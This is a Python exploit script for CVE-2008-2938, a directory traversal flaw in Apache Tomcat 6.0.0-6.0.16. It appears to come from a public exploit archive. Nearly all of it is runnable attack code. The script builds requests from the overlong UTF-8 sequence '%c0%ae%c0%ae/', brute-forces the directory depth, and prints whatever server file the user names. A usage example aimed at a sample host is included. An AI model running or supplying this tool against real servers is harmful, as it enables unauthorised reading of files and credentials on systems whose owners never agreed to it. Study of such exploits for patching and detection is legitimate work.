'''
Vulnerability: Directory traversal
CVE: CVE-2008-2938
Affects: Apache Tomcat 6.0.0-6.0.16, previous versions not tested.
Description:
        If a context is configured with allowLinking="true" and the connector is
        configured with URIEncoding="UTF-8" then a malformed request may be used
        to access arbitrary files on the server.

        NOTE: These two options are not rare, mostly on UNIX targets.

Affects: 6.0.0-6.0.16
Exploit Author: Agustin Gianni
Date: Wed Aug 13 01:40:49 ART 2008
'''

import urllib
import getopt
import sys

def usage():
        help_string = "Apache Tomcat 6.0.0-6.0.16 Directory traversal exploit\n"
        help_string += "by Agustin Gianni (agustingianni(at)gmail.com)\n"
        help_string += "\n"
        help_string += "Usage:\n"
        help_string += "\t-H, --help Shows This help\n"
        help_string += "\t-h, --host=host Sets the host of the vulnerable Tomcat service\n"
        help_string += "\t-f, --file=file This is the file you want to retreive\n"
        help_string += "\t-p, --proxy=proxy If you want to use a proxy\n"
        help_string += "\t-m, --max_depth=max Brute force tomcat's directory depth\n"
        help_string += "\t-d, --depth=depth Exact tomcat's directory depth\n\n"
        help_string += "\tExample:\n\n"
        help_string += "\tgr00vy@kenny:~$ python tomcat.py -h http://192.168.1.104:8080/sample -f WINDOWS/system.ini -d 5"
        
        print help_string

def main():
        try:
                opts, args = getopt.getopt(sys.argv[1:], "d:m:vHh:f:p:", \
                        ["max_depth", "depth", "verbose", "help", "host=", "file=", "proxy="])
        except getopt.GetoptError, err:
                print str(err) # will print something like "option -a not recognized"
                usage()
                sys.exit(2)

        current_depth = 1
        max_depth = 2
        file_to_get = None
        host = None
        verbose = False
        proxies = None

        for option, argument in opts:
                if option in ("-v", "--verbose"):
                        verbose = True
                elif option in ("-H", "--help"):
                        usage()
                        sys.exit()
                elif option in ("-h", "--host"):
                        # also works with https hosts
                        host = argument
                elif option in ("-m", "--max_depth"):
                        max_depth = int(argument)
                elif option in ("-d", "--depth"):
                        current_depth = int(argument)
                        max_depth = current_depth
                elif option in ("-f", "--file"):
                        file_to_get = argument
                elif option in ("-p", "--proxy"):
                        proxies = {"http" : argument}
                else:
                    assert False, "Invalid option"

        if file_to_get is None or host is None:
                usage()
                sys.exit(2)

        if verbose is True:
                print "Host: ", host
                print "Proxies: ", proxies
                print "File: ", file_to_get
                print "Max depth: ", max_depth

        # Exploit string
        string = r"%c0%ae%c0%ae/"
        
        while current_depth <= max_depth:
                request = "%s/%s%s" %(host, string*current_depth, \
                        file_to_get)
                
                if verbose is True:
                        print "Current depth: %d\nRequest String: %s\n" \
                                %(current_depth, request)

                handle = urllib.urlopen(request, proxies=proxies)

                response = handle.read()

                print response

                current_depth += 1

if __name__ == "__main__":
        main()